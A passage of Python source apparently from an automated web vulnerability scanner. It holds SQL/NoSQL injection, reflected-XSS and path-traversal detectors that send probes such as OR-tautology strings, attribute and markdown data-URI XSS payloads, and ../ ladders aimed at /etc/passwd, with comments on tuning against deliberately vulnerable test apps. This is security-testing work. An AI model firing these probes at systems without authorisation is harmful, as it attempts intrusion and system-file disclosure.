                mongo_ev.append(Evidence("db_error",
                    f"{mo.re.pattern[:40]} matched: {mo.group(0)[:80]} "
                    "(MongoDB/JS engine family — routed to nosql_injection)", r.request_id))
        # 1b) DETECT-04 — status oracle: quote breaks the server (5xx) while the base
        # value AND a syntactically-valid doubled quote both succeed. A 5xx-on-quote
        # alone is weak (apps crash on odd input); the paired controls make it a
        # SQL-shaped signal. 4xx is deliberately EXCLUDED — ginandjuice ?productId=1'
        # returns 400 "Invalid product ID" from input VALIDATION, not SQL (live-proven
        # false lead: flagging it would have been a false positive).
        rq, rb, rp = resp_map.get("quote_error"), resp_map.get("base"), resp_map.get("pair_quote")
        if (rq is not None and rb is not None and rp is not None and
                rq.status >= 500 and rb.ok and rp.ok):
            ev.append(Evidence("status_oracle",
                f"quote -> HTTP {rq.status} (generic error, no DB string) while base -> {rb.status} "
                f"and doubled-quote -> {rp.status} — SQL syntax break", rq.request_id))
        # 2) boolean oracle (status differential, 200 vs 500) — the proven real-world oracle
        rt, rf = resp_map.get("boolean_true"), resp_map.get("boolean_false")
        oracle = False
        if rt is not None and rf is not None and rt.status and rf.status:
            if rt.ok and not rf.ok:
                oracle = True
                ev.append(Evidence("response_diff",
                    f"TRUE probe -> HTTP {rt.status} ({len(rt.body)}B), FALSE probe -> HTTP {rf.status} ({len(rf.body)}B) — boolean oracle", rt.request_id))
            elif abs(len(rt.body or "") - len(rf.body or "")) > max(200, 0.25 * max(len(rt.body or "x"), 1)):
                oracle = True
                ev.append(Evidence("response_diff",
                    f"body-size differential {len(rt.body)}B vs {len(rf.body)}B on condition flip", rt.request_id))
        # 3) DETECT-01 — OR-tautology redirect differential (auth-bypass oracle, string context)
        # ENG-01: hop_location() reads the FIRST-HOP target even when the engine
        # auto-follows the redirect (old code saw only the final 200 — oracle destroyed).
        ot, of = resp_map.get("or_true"), resp_map.get("or_false")
        if ot is not None and of is not None and ot.status and of.status:
            lt, lf = ot.hop_location(), of.hop_location()
            # OWSP-27: echo guard — a Location that CONTAINS the submitted
            # payload is behavioral zero (open-redirect echo), not an oracle.
            if lt and lf and lt != lf and not _echo_diff(
                    lt, lf, f"{_base}' OR '1'='1' -- ", f"{_base}' OR '1'='2' -- "):
                oracle = True
                ev.append(Evidence("redirect_diff",
                    f"OR-tautology redirect differential: TRUE -> {lt}, FALSE -> {lf} — auth-bypass oracle",
                    ot.request_id))
            # 3b) DETECT-05 (live-caught on ginandjuice.shop /catalog?category=): the
            # string-context OR pair must ALSO check the body-size differential — the
            # redirect oracle only exists on auth flows; on data endpoints the tautology
            # changes the RESULT SET SIZE instead (TRUE -> all products 17KB, FALSE ->
            # empty category 9.4KB). The AND-pair already had this check; the OR pair
            # (the only one that works in string contexts) did not.
            elif ot.ok and of.ok and ot.status == of.status:
                bt, bf = len(ot.body or ""), len(of.body or "")
                if abs(bt - bf) > max(200, 0.25 * max(bt, bf, 1)):
                    oracle = True
                    ev.append(Evidence("response_diff",
                        f"OR-pair body-size differential on condition flip: TRUE {bt}B vs FALSE {bf}B "
                        f"(string-context boolean oracle)", ot.request_id))
        # 4) DETECT-06 — numeric-tautology OR pair (auth-bypass oracle, numeric shape).
        #    Same structure as (3): redirect differential first (login flows), then the
        #    body-size differential (data endpoints). Mirrors the guards of (3b):
        #    both responses OK, SAME status, diff > max(200, 25%).
        nt, nf = resp_map.get("ornum_true"), resp_map.get("ornum_false")
        if nt is not None and nf is not None and nt.status and nf.status:
            lnt, lnf = nt.hop_location(), nf.hop_location()
            # OWSP-27 echo guard (numeric family)
            if lnt and lnf and lnt != lnf and not _echo_diff(
                    lnt, lnf, f"{_base}' OR 1=1-- ", f"{_base}' OR 1=2-- "):
                oracle = True
                ev.append(Evidence("redirect_diff",
                    f"numeric-OR redirect differential: TRUE -> {lnt}, FALSE -> {lnf} — auth-bypass oracle",
                    nt.request_id))
            elif nt.ok and nf.ok and nt.status == nf.status:
                bnt, bnf = len(nt.body or ""), len(nf.body or "")
                if abs(bnt - bnf) > max(200, 0.25 * max(bnt, bnf, 1)):
                    oracle = True
                    ev.append(Evidence("response_diff",
                        f"numeric-OR body-size differential on condition flip: TRUE {bnt}B vs FALSE {bnf}B "
                        f"(numeric-shape boolean oracle)", nt.request_id))
        # 5) MAX-09 — paren-closing OR pairs (LIKE-inside-parens contexts).
        #    Same two-oracle structure as (3)/(4): redirect differential first
        #    (login flows), then the body-size differential (data endpoints).
        #    Symmetric failure (500/500 or equal bodies) stays silent — the
        #    anti-FP guard of the flat pairs applies unchanged.
        # 6) OWSP-16 — no-base OR pair: existence-flip oracle on lookup pages
        #    (200 'exists' vs 404 'MISSING'/empty). The base-prefixed families
        #    cannot flip when the base value itself matches a row; the no-base
        #    tautology decides existence alone. Guards: base OK, TRUE probe OK,
        #    FALSE probe NOT OK (status flip, not a size wobble).
        nt2, nf2, rb2 = resp_map.get("nb_or_true"), resp_map.get("nb_or_false"), resp_map.get("base")
        if nt2 is not None and nf2 is not None and nt2.status and nf2.status:
            if rb2 is not None and rb2.ok and nt2.ok and not nf2.ok:
                oracle = True
                ev.append(Evidence("status_flip",
                    f"no-base OR existence flip: base -> {rb2.status}, tautology TRUE -> {nt2.status} "
                    f"({len(nt2.body or '')}B), FALSE -> {nf2.status} ({len(nf2.body or '')}B) "
                    "— boolean-blind oracle", nt2.request_id))
        for _pt, _pf, _lbl, _ppt, _ppf in (("par2_true", "par2_false", "paren2", "')) OR 1=1-- ", "')) OR 1=2-- "),
                               ("par1_true", "par1_false", "paren1", "') OR 1=1-- ", "') OR 1=2-- ")):
            pt, pf = resp_map.get(_pt), resp_map.get(_pf)
            if pt is not None and pf is not None and pt.status and pf.status:
                lpt, lpf = pt.hop_location(), pf.hop_location()
                # OWSP-27 echo guard (paren families)
                if lpt and lpf and lpt != lpf and not _echo_diff(
                        lpt, lpf, _base + _ppt, _base + _ppf):
                    oracle = True
                    ev.append(Evidence("redirect_diff",
                        f"{_lbl} OR redirect differential: TRUE -> {lpt}, FALSE -> {lpf} — "
                        "paren-closing auth-bypass oracle", pt.request_id))
                elif pt.ok and pf.ok and pt.status == pf.status:
                    bpt, bpf = len(pt.body or ""), len(pf.body or "")
                    if abs(bpt - bpf) > max(200, 0.25 * max(bpt, bpf, 1)):
                        oracle = True
                        ev.append(Evidence("response_diff",
                            f"{_lbl}-OR body-size differential on condition flip: TRUE {bpt}B vs "
                            f"FALSE {bpf}B (paren-closing boolean oracle)", pt.request_id))
        if not ev and not mongo_ev and not js_ev:
            return None
        if _nc_channel:
            # GTP-01/GTP-02: mark the channel so the verifier replays the probe
            # through the SAME shape (renamed clone / synthetic segment) — a
            # plain value-mutation replay would probe a dead channel.
            ev.append(Evidence("input_channel",
                               f"channel={_nc_channel[0]} anchor={_nc_channel[1][:64]} "
                               "injection rode the parameter NAME (or synthetic segment), "
                               "not the value", None))
        if ev:
            return Finding(type="sql_injection", severity=self.severity, endpoint_url=ep.url,
                           parameter=p.name, method=ep.method, evidence=ev, status=FindingStatus.CANDIDATE)
        # OWSP-30/31 (NodeGoat round): Mongo error signatures and/or the JS
        # tautology differential WITHOUT any SQL-family evidence — the sink
        # evaluates JAVASCRIPT, not SQL. The class names the engine family;
        # verification replays the JS pair / error signature (intel.py).
        return Finding(type="nosql_injection", severity=self.severity, endpoint_url=ep.url,
                       parameter=p.name, method=ep.method, evidence=(mongo_ev + js_ev),
                       status=FindingStatus.CANDIDATE)


class XSSDetector(Detector):
    name, vuln_type = "xss", "xss_reflected"
    severity = Severity.HIGH
    CANARY = "burhanxssmarker"
    # DETECT-14 (Phase 54): context-adaptive battery. ONE benign known-tag probe per
    # mutable param decides the battery — live-modeled on ginandjuice.shop /blog?search
    # (tag+handler blacklist: every known tag 400s, quote payloads pass raw) and on
    # AngularJS pages (braces survive every HTML escaper; the expression evaluates in
    # any ng-app binding on render):
    #   tag-filtered (probe 400/403)  -> attr_inject battery (no '<' at all)
    #   ng-app in the page            -> + {{expression}} vector
    #   plain                         -> classic full-tag + slash-free battery
    # The probe costs one request per param and its response never fabricates a
    # candidate (it contains no battery needle).
    ATTR_PAYLOAD = 'pro43" onfocus="burhanAttr'
    NG_PAYLOAD = "{{91*7}}burhanngmark"
    # OWSP-34 (NodeGoat round, live-caught on /memos POST memo=): markdown
    # sanitizer-bypass family. The sink renders user markdown (marked 0.3.5
    # with sanitize:true) — raw HTML tags are correctly ESCAPED (the classic
    # battery honestly finds nothing) but markdown links pass data:text/html
    # URIs through RAW: [x](data:text/html;base64,...) -> <a href="data:...">.
    # The ORACLE is the RENDERED ANCHOR SHAPE, not raw reflection — the
    # payload text itself is inert, so this family cannot fire on plain
    # reflections (the payload echoed raw contains no '<a href=data:' shape).
    MD_B64 = __import__("base64").b64encode(b"burhanxssmarker").decode()
    MD_PAYLOAD = "[burhanxssmarkermd](data:text/html;base64," + MD_B64 + ")"
    # XS-2: sacrificial tail for the last-char-mangle family — the mangler
    # eats/rewrites exactly ONE trailing char; two 'z's leave the untailed
    # needle intact in the reflection (drop-last -> NEEDLE+'z',
    # Z-rewrite -> NEEDLE+'zZ').
    TAIL = "zz"

    def _context_probe(self, ep, p) -> tuple[str, bool]:
        """Send '<b>canaryflt</b>'; classify the param's input context."""
        try:
            r = self.engine.send(RequestMutation(
                endpoint=ep, param_name=p.name,
                param_value=f"<b>{self.CANARY}flt</b>", note="xss-context-probe"))
        except Exception:
            r = None
        if r is None or r.error:
            return "unknown", False
        filtered = r.status in (400, 403)
        angular = "ng-app" in (r.body or "").lower()
        return ("filtered" if filtered else "plain"), angular

    def candidates(self, ep: Endpoint):
        out = []
        for p in ep.parameters:
            if p.kind == ParamKind.TOKEN or p.flow_control or getattr(p, "is_file", False):
                continue          # Phase 50: mutating a CSRF token only breaks the flow; OWSP-18: file fields are upload-only
            mode, angular = self._context_probe(ep, p)
            # VR-03 (live-caught on ginandjuice.shop /catalog?category=): the full-tag
            # canary carries a closing tag </burhanxssmarker> — apps that escape only
            # the '/' (e.g. </ -> <\/ as JS-string hardening) break the needle match
            # even though < and > pass RAW (real reflection: const x = "Gin<svg onload=..>").
            # Slash-free variant detects the unescaped-markup weakness independently.
            if mode != "filtered":
                out.append(("full_tag", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=f"<{self.CANARY}>pro41</{self.CANARY}>")))
                out.append(("slash_free", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=f"<{self.CANARY}pro42")))
                # XS-2 (xss recall round, live-caught on the OWASP Benchmark
                # master = v1.2 — the whole remaining 27 of the 60 xss FNs):
                # the last-char-mangle family. Every source in the family
                # destroys EXACTLY ONE TRAILING CHARACTER of the input before
                # the writer sink reflects it — substring(0, len-1) DROPS it
                # (live: 02134 reflects '<burhanxssmarker>pro41
                # </burhanxssmarker' — the closing '>' eaten) or
                # StringBuilder.replace(len-1, len, "Z") REWRITES it (live:
                # 00392/00146/01666) — so the verbatim needle check on the
                # plain canary NEVER matches and the family stayed silent.
                # The sacrificial tail: append two trailing chars the mangler
                # is welcome to eat — drop-last leaves NEEDLE+'z', Z-rewrite
                # leaves NEEDLE+'zZ' — either way the UNTAILED needle (the
                # existing analyze() checks, unchanged) survives verbatim in
                # the reflection. Channels vary across the family (plain
                # param, self-named form param, Referer header, raw
                # query-string); sinks vary (write/print/println/format/
                # printf) — the mangle is the family; the tail rides the
                # param's own channel so every variant is covered.
                out.append(("tail_full", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=f"<{self.CANARY}>pro41</{self.CANARY}>{self.TAIL}")))
                out.append(("tail_slash", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=f"<{self.CANARY}pro42{self.TAIL}")))
            else:
                # tag-filtered context: attribute injection needs no '<' — the handler
                # rides into a tag the SERVER itself emitted (live-executed on
                # ginandjuice /blog?search: " onload="... into the tracker img).
                out.append(("attr_inject", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=self.CANARY + self.ATTR_PAYLOAD)))
            if angular:
                out.append(("ng_expr", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=self.NG_PAYLOAD)))
            # OWSP-34: markdown-link family fires in EVERY context (no '<' in
            # the payload — survives tag filters; escaped-HTML sinks still
            # render markdown links raw when a markdown renderer sits behind
            # the escaping).
            out.append(("md_link", RequestMutation(endpoint=ep, param_name=p.name,
                    param_value=self.MD_PAYLOAD)))
            # GTP-01 (ground-truth push): the reflection channel can be the
            # parameter NAME itself (resolver surfaces echo the submitted
            # field name). The canary rides the NAME via a renamed clone;
            # analyze()'s needle check is channel-agnostic (it looks for the
            # needle in the body — a name reflection contains it verbatim).
            # XS-1 (xss recall round, live-caught on the OWASP Benchmark master
            # = v1.2): the battery was gated to QUERY params, but the entire
            # benchmark xss resolver family (33 of the 60 xss FNs) reads the
            # match from a POST FORM body (openapi requestBody ->
            # x-www-form-urlencoded -> ParamLocation.BODY; live-proven on
            # BenchmarkTest00036/00549: form field <canary>=<TCID> (the
            # schema-default burhan riding the renamed clone) -> the
            # resolver writes the field NAME into the response raw, control
            # benign-name echoes the benign name only, the safe twins
            # 00544/00545/00546 structurally discard the name (live: the
            # response is the literal 'moresafe')). The gate now admits BODY
            # params with the same non-token/non-flow-control discipline —
            # the exact mirror of the SQ-1 nminj fix on the sqli side.
            if p.kind != ParamKind.TOKEN and not p.flow_control and p.location in (
                    ParamLocation.QUERY, ParamLocation.BODY):
                # XS-3 (xss recall round, live-caught on the crossover test
                # BenchmarkTest02324 — the last of the 60 xss FNs): the
                # resolver family (payload rides the NAME, value==basename
                # burhan) crossed with the last-char-mangle family (the
                # sink rewrites ONE trailing char, live: the tailed name
                # reflects as needle+'zZ'). The plain xname probe dies there
                # (the canary's own final char is eaten), so the name battery
                # gains the TAILED variants — the canary+TAIL rides the NAME
                # (renamed clone, burhan value preserved); the mangler eats
                # the tail and the UNTAILED needle (the existing analyze()
                # checks, unchanged) survives verbatim in the reflection.
                for tag, payload in (("xname_full", f"<{self.CANARY}>pro41</{self.CANARY}>"),
                                     ("xname_slash", f"<{self.CANARY}pro42"),
                                     ("xname_tail_full",
                                      f"<{self.CANARY}>pro41</{self.CANARY}>{self.TAIL}"),
                                     ("xname_tail_slash",
                                      f"<{self.CANARY}pro42{self.TAIL}")):
                    epc = _clone_ep_rename_param(ep, p.name, payload)
                    out.append((tag, RequestMutation(endpoint=epc, param_name=payload,
                                                     param_value=p.value or "1")))
        # GTP-02: paramless surfaces — the self-named servlet convention (the
        # path's last segment as field name) and the transposed resolver
        # shape (canary as name, segment as value). MAX-10a: never on a
        # logout/destructive/command-shaped surface.
        if not ep.parameters and (ep.method or "GET").upper() in ("POST", "GET") \
                and not command_shaped_endpoint(ep):
            seg = last_path_segment(ep.url)
            if seg and 4 <= len(seg) <= 64:
                out.append(("xseg_val", RequestMutation(endpoint=ep, param_name=seg,
                        param_value=f"<{self.CANARY}>pro41</{self.CANARY}>")))
                out.append(("xseg_name", RequestMutation(endpoint=ep, param_name=f"<{self.CANARY}pro42",
                        param_value=seg)))
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.body: return None
        # DETECT-10 (live-proven on ginandjuice.shop /catalog/subscribe): the email
        # param reflects RAW inside an application/json response — but a JSON body is
        # parsed as data by the browser, never as markup. Flagging it would be a
        # FALSE POSITIVE; the real verdict belongs to the browser submit-flow (does
        # the client render the response value into an HTML sink?). Only HTML-ish
        # (or unspecified) response types are candidate XSS reflections here.
        ct = (resp.headers or {}).get("content-type", "")
        if "json" in ct.lower() and "html" not in ct.lower():
            return None
        checks = [
            (f"<{self.CANARY}>pro41</{self.CANARY}>", "unescaped_reflection"),
            (f"<{self.CANARY}pro42", "unescaped_reflection"),
            (self.CANARY + self.ATTR_PAYLOAD, "attribute_injection_reflection"),
            (self.NG_PAYLOAD, "ng_expression_reflection"),
        ]
        for needle, kind in checks:
            if needle in resp.body:
                i = resp.body.find(needle)
                # DETECT-15 (v4.2.3): an {{expression}} canary that lands inside
                # script/style content is NOT in an Angular binding context — skip it
                # (the reflection itself may be real, but claiming client-side
                # evaluation there is a false verdict; IV14 adjudicated the
                # ginandjuice searchTerm claim as exactly this false positive).
                if kind == "ng_expression_reflection" and in_script_or_style(resp.body, i):
                    continue
                ctx = resp.body[max(0, i - 60):i + len(needle) + 30].replace("\n", " ")
                detail = {"attribute_injection_reflection":
                              "quote+event-handler reflected raw — injectable attribute context, no '<' needed (tag-filter resistant)",
                          "ng_expression_reflection":
                              "Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics"}.get(kind, f"canary reflected raw in context: …{ctx}…")
                _nc_ev = ([Evidence("input_channel",
                                   f"channel=name_channel anchor={p.name[:64]} — the canary rode the "
                                   "parameter NAME (renamed-clone probe); the verifier must replay the "
                                   "name channel, not a value mutation", None)]
                          if self.CANARY in (p.name or "") else [])
                return Finding("xss_reflected", Severity.HIGH, ep.url, p.name, ep.method,
                           [Evidence(kind, detail + f" [ctx: …{ctx}…]", resp.request_id)] + _nc_ev,
                           status=FindingStatus.CANDIDATE)
        # OWSP-34: markdown data:URI link — the oracle is the RENDERED ANCHOR
        # (<a href="data:text/html...">), never raw reflection of the payload
        # text: a markdown renderer TRANSFORMS the syntax (the raw text is gone
        # on a real marked/sanitizer sink), so the payload-text precondition
        # would kill the very case this family exists for. The canary-derived
        # link text or the canary-derived base64 inside the anchor segment is
        # the tie to OUR probe (an app-native data: anchor carries neither).
        for m in re.finditer(r'<a\s[^>]*href=["\']?\s*data:text/html', resp.body):
            seg = resp.body[m.start():m.start() + 500]
            if ("burhanxssmarkermd" in seg) or (self.MD_B64 in seg):
                return Finding("xss_reflected", Severity.HIGH, ep.url, p.name, ep.method,
                    [Evidence("md_datauri_reflection",
                              f"markdown link rendered as a raw anchor with an executable "
                              f"data:text/html href (sanitizer-bypass shape): {seg[:160]}",
                              resp.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None


class TraversalDetector(Detector):
    name, vuln_type = "traversal", "path_traversal"
    severity = Severity.HIGH
    MARKERS = [("[fonts]", "win.ini"), ("[boot loader]", "boot.ini"), ("root:x:0:0:", "/etc/passwd"),
               ("BURHAN-SECRET-FILE", "fixture secret file")]


    # GTP-03 (ground-truth push, live-caught on the OWASP Benchmark — 133/133
    # pathtraver FNs): three families were structurally missing.
    #   (a) ABSOLUTE-path payloads: java.io.File(parent, child) DISCARDS the
    #       parent when child is absolute — /etc/passwd lands directly with
    #       ZERO traversal segments, and every relative ladder shape misses.
    #   (b) DEPTH: the ladder stopped at 8 — the Benchmark's readable base is
    #       <cwd>/testfiles (cwd 6 deep), so /etc/passwd needs 7 ups; 4/6/8
    #       never reached it. Ladder now spans 2..12.
    #   (c) EXISTENCE ORACLE: file-shaped sinks that only report "exists"/
    #       "created" (new File(...).exists()) leak a BOOLEAN file-existence
    #       oracle — a KNOWN-existing file (etc/passwd) vs a burhan-random
    #       MISSING one must answer differently after neutralizing the payload
    #       echo. This is the classic blind file-probe oracle against real
    #       apps whose file reads never echo content.
    ABS_PAYLOADS = ["/etc/passwd", "/etc/hostname", "C:\\windows\\win.ini"]
    EXISTS_MISSING = "burhan-missing-{d}"
    # PT-1 (recall push, live-caught on the OWASP Benchmark round-6 eval): the
    # 2-param budget spent itself on the first two form fields and never sent a
    # single traversal payload when the sink param sat THIRD+ in the surface
    # (the Benchmark's own openapi spec declares ['password','username',
    # 'BenchmarkTestNNNNN'] — the vuln param is third; 30/82 pathtraver FNs;
    # live-proven on BenchmarkTest00362: the writability pair on the 3rd param
    # answers 231B 'Now ready to write to file:' vs 0B while username is
    # uniformly silent). Budget is now PROPORTIONAL: first 2 eligible params
    # keep the full battery; params 3-4 get a reduced set (ladder-7 + the two
    # absolute Unix targets — 3 payloads, the minimum that still covers the
    # absolute-path family (a) and the depth family (b) of GTP-03).
    # [PT-1 fix-up, 2026-10-12: commit 791e037 shipped this fix's PROOF
    # artifacts but not the code itself — a reset --hard between proof and
    # staging silently reverted the engine files. Re-applied verbatim.]
    BUDGET_FULL, BUDGET_TOTAL = 2, 4
    REDUCED_PAYLOADS = ["../" * 7 + "etc/passwd", "/etc/passwd", "/etc/hostname"]

    def eligible_params(self, ep: Endpoint):
        """PT-1: ordered (full_battery_params, reduced_battery_params).
        Eligibility unchanged (non-TOKEN, non-flow-control, named); only the
        SPREAD changed — trailing params get reduced coverage instead of
        none. Shared by candidates() and the orchestrator's exists_pair loop
        so both budgets move together."""
        eligible = [p for p in ep.parameters
                    if p.kind != ParamKind.TOKEN and not p.flow_control and p.name]
        return (eligible[:self.BUDGET_FULL],
                eligible[self.BUDGET_FULL:self.BUDGET_TOTAL])

    def candidates(self, ep: Endpoint):
        payloads = []
        for depth in (2, 4, 6, 7, 8, 10, 12):
            payloads.append("../" * depth + "etc/passwd")
        payloads.append("....//....//....//windows/win.ini")
        payloads.extend(self.ABS_PAYLOADS)
        full, reduced = self.eligible_params(ep)
        out = [(pl, RequestMutation(endpoint=ep, param_name=p.name, param_value=pl))
               for p in full for pl in payloads]
        # PT-1: trailing params — reduced set (3 payloads), bounded cost
        out += [(pl, RequestMutation(endpoint=ep, param_name=p.name, param_value=pl))
                for p in reduced for pl in self.REDUCED_PAYLOADS]
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.body: return None
        # GTP-03b: marker match against the ENTITY-NORMALIZED view — the raw
        # body carries 'root&#x3a;x&#x3a;0&#x3a;0&#x3a;' (ESAPI) and the literal
        # 'root:x:0:0:' never appears; the normalized view restores it.
        body_n = entity_normalize(resp.body)
        for marker, fname in self.MARKERS:
            if marker in body_n:
                i = body_n.find(marker)
                return Finding("path_traversal", Severity.HIGH, ep.url, p.name, ep.method,
                               [Evidence("file_marker", f"content of {fname} leaked (marker {marker!r} at offset {i})",
                                         resp.request_id, resp.body[i:i + 200])],
                               status=FindingStatus.CANDIDATE, detector=self.name)
        # GTP-03(c): existence-oracle candidates ride the note channel — the
        # orchestrator's existence pair (exists vs missing) lands here with
        # resp tagged 'trav_exists:<payload>'; the differential is computed by
        # the detector's exists_pair() entry (called by the orchestrator).
        return None

    def exists_pair(self, ep: Endpoint, p, depths=(7, 8)):
        """GTP-03(c): blind file-existence oracle — KNOWN-existing file vs
        burhan-random missing file, payload-echo neutralized. Fires when the
        two responses differ BEYOND the reflected payload (status, or body
        with both payload texts stripped). A canonicalizing app answers both
        identically (honest silence); a leaky exists() sink flips.
        PT-1 adds `depths`: trailing-budget params pass a single depth (7) —
        the benchmark base is 6-7 deep, one depth still reaches it — keeping
        the added-coverage cost bounded (4 requests, not 8)."""
        import time as _t
        missing = self.EXISTS_MISSING.format(d=_stable_probe_id(ep.url, p.name))
        for depth in depths:
            base_up = "../" * depth
            rk = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                 param_value=base_up + "etc/passwd",
                                                 note="trav-exists-known"))
            rm = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                 param_value=base_up + "etc/" + missing,
                                                 note="trav-exists-missing"))
            # GTP-03c (wave 3, live-caught on the Benchmark's 39 FileOutputStream
            # tests — 00002/00028 family): write-capable sinks answer a WRITABILITY
            # oracle, not an existence one (both /etc/passwd and /etc/<miss> are
            # unwritable -> identical empty responses -> exists_pair stayed
            # silent). A writable-dir probe (ladder + tmp/burhan-w-<r>) vs an
            # unwritable one (ladder + etc/burhan-w-<r2>) separates them: the
            # response text for the open appears only for the writable target.
            import random as _rw3
            wr = f"burhan-w-{_rw3.randrange(1000, 99999)}"
            rw = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                 param_value=base_up + "tmp/" + wr,
                                                 note="trav-writable"))
            rnx = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                  param_value=base_up + "etc/" + wr,
                                                  note="trav-unwritable"))
            if rk is None or rm is None or rk.error or rm.error or not rk.status or not rm.status:
                continue
            if rk.status != rm.status:
                return Finding("path_traversal", Severity.HIGH, ep.url, p.name, ep.method,
                    [Evidence("exists_oracle",
                              f"blind file-existence differential at depth {depth}: known file "
                              f"(etc/passwd) -> HTTP {rk.status}, missing (etc/{missing}) -> "
                              f"HTTP {rm.status} — the sink leaks file existence outside its base",
                              rk.request_id)],
                    status=FindingStatus.CANDIDATE, detector=self.name)
            # GTP-03b: neutralize the echo on the ENTITY-NORMALIZED view — the
            # payload echoes back HTML-encoded (&#x2f;home&#x2f;...); the raw
            # .replace() never stripped it, so the differential measured the
            # ENCODING, and on a canonicalizing app the two payloads' own
            # length delta (~30B for burhan-missing-<d> vs passwd) could
            # masquerade as a leak. Normalized + stripped = real differential.
            # GTP-12a: echo_neutralize also kills the %-encoded echo and the
            # app-side last-char strip (six crypto-servlet FPs live-caught).
            bk2 = echo_neutralize(rk.body or "", base_up + "etc/passwd", "etc/passwd")
            bm2 = echo_neutralize(rm.body or "", base_up + "etc/" + missing, "etc/" + missing)
            bk2 = bk2.replace(missing, "")
            if bk2 != bm2:
                # PT-1b (live-caught on the round-7 full-benchmark re-run): the
                # PT-1 extended budget reached the crypto/hash servlets' own
                # params and 9 false exists_oracle candidates VERIFIED -- those
                # surfaces echo a TRANSFORMED DERIVATIVE of the param (cipher
                # text / digest of the payload), so ANY two payloads answer
                # differently and the known-vs-missing "differential" is pure
                # input echo, not a file-existence signal (live-proven on
                # BenchmarkTest02190: two different KNOWN-MISSING payloads
                # answer differently too). Guard: a second, independent missing
                # payload must answer IDENTICALLY to the first -- only then is
                # the differential attributable to the exists axis.
                miss2b = self.EXISTS_MISSING.format(
                    d=_stable_probe_id(ep.url, p.name, depth))
                rm2b = self.engine.send(RequestMutation(
                    endpoint=ep, param_name=p.name,
                    param_value=base_up + "etc/" + miss2b,
                    note="trav-exists-missing2"))
                if rm2b is not None and not rm2b.error and rm2b.status:
                    bm2b = echo_neutralize(rm2b.body or "",
                                           base_up + "etc/" + miss2b,
                                           "etc/" + miss2b, miss2b)
                    if bm2b != bm2:
                        continue    # echo-derivative surface -- honest silence
                # GTP-03b(w3): the >8 length gate killed REAL differentials — the
                # exists-oracle answers ('And file already exists.' 23B vs "But
                # file doesn't exist yet." 27B) are 4B apart; after echo
                # neutralization ANY remaining difference IS the oracle's answer.
                return Finding("path_traversal", Severity.HIGH, ep.url, p.name, ep.method,
                    [Evidence("exists_oracle",
                              f"blind file-existence differential at depth {depth}: known file "
                              f"({len(rk.body or '')}B) vs missing ({len(rm.body or '')}B) differ "
                              f"beyond the echoed payload — the sink leaks file existence "
                              f"outside its base", rk.request_id)],
                    status=FindingStatus.CANDIDATE, detector="traversal")
            # GTP-12e (round 5, live-caught: BenchmarkTest00002 — the type case
            # of GTP-03c's own comment): a write-capable sink answers IDENTICAL
            # EMPTY responses on the existence pair (/etc/passwd and
            # /etc/<miss> are both unwritable) and only separates on
            # writable-vs-unwritable targets — but the writability check was
            # nested INSIDE the exists-DIFFERS branch, so it never ran for the
            # exact family it was built for (34 FileOutputStream FNs on the
            # round-4 measurement: tmp 193B 'Now ready to write to file:' vs
            # etc 0B, verified live, zero candidates produced). Hoisted to run
            # exactly when the existence oracle stays silent.
            if rw is not None and rnx is not None and not rw.error and not rnx.error \
                    and rw.status and rnx.status:
                # GTP-12a: transformation-aware echo neutralization — the
                # plain replace missed the %-encoded + last-char-stripped
                # echo and false-verified crypto servlets (6 live FPs).
                bw = echo_neutralize(rw.body or "", base_up + "tmp/" + wr,
                                     "tmp/" + wr, wr)
                bn = echo_neutralize(rnx.body or "", base_up + "etc/" + wr,
                                     "etc/" + wr, wr)
                if bw != bn:
                    # PT-1b: same echo-derivative guard on the writability axis --
                    # a second INDEPENDENT writable-dir payload must answer
                    # identically, else the differential is a transformed echo.
                    import random as _rw3b
                    wr2 = f"burhan-w-{_rw3b.randrange(1000, 99999)}"
                    rw2 = self.engine.send(RequestMutation(
                        endpoint=ep, param_name=p.name,
                        param_value=base_up + "tmp/" + wr2, note="trav-writable2"))
                    if rw2 is not None and not rw2.error and rw2.status:
                        bw2 = echo_neutralize(rw2.body or "", base_up + "tmp/" + wr2,
                                              "tmp/" + wr2, wr2)
                        if bw2 != bw:
                            continue    # echo-derivative surface -- honest silence
                    return Finding("path_traversal", Severity.HIGH, ep.url, p.name, ep.method,
                        [Evidence("writability_oracle",
                                  f"blind WRITABILITY differential at depth {depth}: writable "
                                  f"({base_up}tmp/{wr}) vs unwritable ({base_up}etc/{wr}) "
                                  f"answers differ beyond the echo — write-capable sink "
                                  f"(FileOutputStream family) leaks path writability "
                                  f"outside its base", rw.request_id)],
                        status=FindingStatus.CANDIDATE, detector="traversal")
        return None



def entity_normalize(text: str) -> str:
    """GTP-03b (round 2, live-caught on the OWASP Benchmark): ESAPI-style HTML
    encoders emit &#x3a; for ':', &#x2f; for '/', &#xa; for newline — the
    Benchmark's file-content echoes print 'root&#x3a;x&#x3a;0&#x3a;0&#x3a;root'
    and the literal marker 'root:x:0:0:' NEVER appears in the raw body. This
    normalizer decodes hex/decimal entities plus the named five so marker
    matching and echo-neutralization work on encoded output. Idempotent on
    plain bodies (no entities -> byte-identical return)."""
    if not text or "&" not in text:
        return text or ""
    _NAMED = {"amp": "&", "lt": "<", "gt": ">", "quot": '"', "apos": "'"}
    _RX = re.compile(r"&#x([0-9a-fA-F]+);|&#(\d+);|&(amp|lt|gt|quot|apos);")
    def _dec(m):
        h, d, nm = m.group(1), m.group(2), m.group(3)
        try:
            if h is not None:
                return chr(int(h, 16))
            if d is not None:
                return chr(int(d))
            if nm is not None:
                return _NAMED[nm]
        except (ValueError, OverflowError):
            pass
        return m.group(0)
    return _RX.sub(_dec, text)


def echo_neutralize(body: str, *payloads: str) -> str:
    """GTP-12a (round 5, live-caught on the OWASP Benchmark): strip EVERY
    transformation of the probe payloads from a response body BEFORE a
